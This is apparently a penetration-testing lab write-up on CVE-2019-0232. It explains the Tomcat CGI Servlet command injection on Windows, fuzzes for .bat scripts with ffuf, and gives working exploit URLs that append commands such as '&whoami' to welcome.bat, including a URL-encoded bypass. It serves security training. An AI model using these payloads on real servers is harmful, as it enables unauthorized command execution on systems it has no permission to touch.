`CVE-2019-0232` is a critical security issue that could result in remote code execution. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash.

CGI scripts are utilised in websites for several reasons, but there are also some pretty big disadvantages to using them:

| **Advantages**                                                                               | **Disadvantages**                                                          |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| It is simple and effective for generating dynamic web content.                               | Incurs overhead by having to load programs into memory for each request.   |
| Use any programming language that can read from standard input and write to standard output. | Cannot easily cache data in memory between page requests.                  |
| Can reuse existing code and avoid writing new code.                                          | It reduces the server's performance and consumes a lot of processing time. |
The `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. 

Suppose you have a CGI script that allows users to search for books in a bookstore's catalogue. The script has two possible actions: "search by title" and "search by author."
`http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby`

Here, the `action` parameter is set to `title`, indicating that the script should search by book title. The `query` parameter specifies the search term "the great gatsby."

However, a problem arises when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.

For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server. An example of this is `http://example.com/cgi-bin/hello.bat?&dir`, which passes `&dir` as an argument to `hello.bat` and executes `dir` on the server. As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.

## Enumeration
We first need to scan open ports to find (for example) `Apache Tomcat/9.0.17` running on port `8080`.
### Finding a CGI Script
One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist. Knowing that the default directory for CGI scripts is `/cgi`, we fuzz for different extensions (**always fuzz inside /cgi if Tomcat even though /cgi is 404)**:
```sh
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
### Exploitation
As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`
```sh
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# Then try whoami
http://10.129.204.227:8080/cgi/welcome.bat?&whoami
# If there is no output, check env variables -> perhaps PATH is not set
http://10.129.204.227:8080/cgi/welcome.bat?&set
# If so, we need absolute paths
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
# If it still errors -> Tomcat prevents special chars so URL encode it
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
